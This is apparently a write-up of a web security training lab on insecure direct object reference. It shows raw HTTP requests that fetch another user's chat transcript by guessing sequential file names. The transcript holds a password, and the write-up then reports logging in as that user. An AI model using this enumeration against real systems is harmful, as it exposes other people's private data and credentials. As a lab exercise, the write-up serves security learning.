##  This lab stores user chat logs directly on the server's file system, and retrieves them using static URLs. Solve the lab by finding the password for the user carlos, and logging into their account. 

![image](https://github.com/Ruhanyat-994/myCTF/assets/110297704/359fae31-77e2-4c51-98c6-c898a039143f)

- We are looking into the live chat button
- Here we can find View transcript
- If we click that button its automatically downloaded a reply 
- The file name is changing in every iteration 
- it started with 2.txt
- we have to check if we can access the other files like 1.txt , 3.txt from client side 

## POST METHOD
#### Request
```sh
POST /download-transcript/1.txt HTTP/2
Host: 0ac5000603fa35608415c7fb003d0049.web-security-academy.net
Cookie: session=tUAh9r6nR0f87d6hCAySxYX4pq9DqLHr
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------58624343111989983041166148171
Content-Length: 547
Origin: https://0ac5000603fa35608415c7fb003d0049.web-security-academy.net
Referer: https://0ac5000603fa35608415c7fb003d0049.web-security-academy.net/chat
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=1
Te: trailers

-----------------------------58624343111989983041166148171
Content-Disposition: form-data; name="transcript"

CONNECTED: -- Now chatting with Hal Pline --<br/>System: --- Disconnected ---<br/>Hal Pline: I've made up my mind. I'm going travelling. Bother someone else with your ludicrous requests.<br/>CONNECTED: -- Now chatting with Hal Pline --<br/>You: hello<br/>Hal Pline: If you try and ask me a question with music at full volume, I won't hear it. Is that not obvious to you?
-----------------------------58624343111989983041166148171--

```
#### Response
```sh
HTTP/2 302 Found
Location: /download-transcript/4.txt
X-Frame-Options: SAMEORIGIN
Content-Length: 0


```
- POST method is giving us error 
- Lets try with GET

## GET METHOD
#### Request
```sh
GET /download-transcript/1.txt HTTP/2
Host: 0ac5000603fa35608415c7fb003d0049.web-security-academy.net
Cookie: session=tUAh9r6nR0f87d6hCAySxYX4pq9DqLHr
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------58624343111989983041166148171
Content-Length: 547
Origin: https://0ac5000603fa35608415c7fb003d0049.web-security-academy.net
Referer: https://0ac5000603fa35608415c7fb003d0049.web-security-academy.net/chat
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=1
Te: trailers

-----------------------------58624343111989983041166148171
Content-Disposition: form-data; name="transcript"

CONNECTED: -- Now chatting with Hal Pline --<br/>System: --- Disconnected ---<br/>Hal Pline: I've made up my mind. I'm going travelling. Bother someone else with your ludicrous requests.<br/>CONNECTED: -- Now chatting with Hal Pline --<br/>You: hello<br/>Hal Pline: If you try and ask me a question with music at full volume, I won't hear it. Is that not obvious to you?
-----------------------------58624343111989983041166148171--

```

#### Response
```sh
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="1.txt"
X-Frame-Options: SAMEORIGIN
Content-Length: 520

CONNECTED: -- Now chatting with Hal Pline --
You: Hi Hal, I think I've forgotten my password and need confirmation that I've got the right one
Hal Pline: Sure, no problem, you seem like a nice guy. Just tell me your password and I'll confirm whether it's correct or not.
You: Wow you're so nice, thanks. I've heard from other people that you can be a right ****
Hal Pline: Takes one to know one
You: Ok so my password is tqj8lryq2ssu4pek0qd3. Is that right?
Hal Pline: Yes it is!
You: Ok thanks, bye!
Hal Pline: Do one!

```
- Our user name is carlos which was given in the lab manual
- password is tqj8lryq2ssu4pek0qd3

![image-1](https://github.com/Ruhanyat-994/myCTF/assets/110297704/1d1693ec-6480-477e-b985-6e604e828414)


# Pwned!
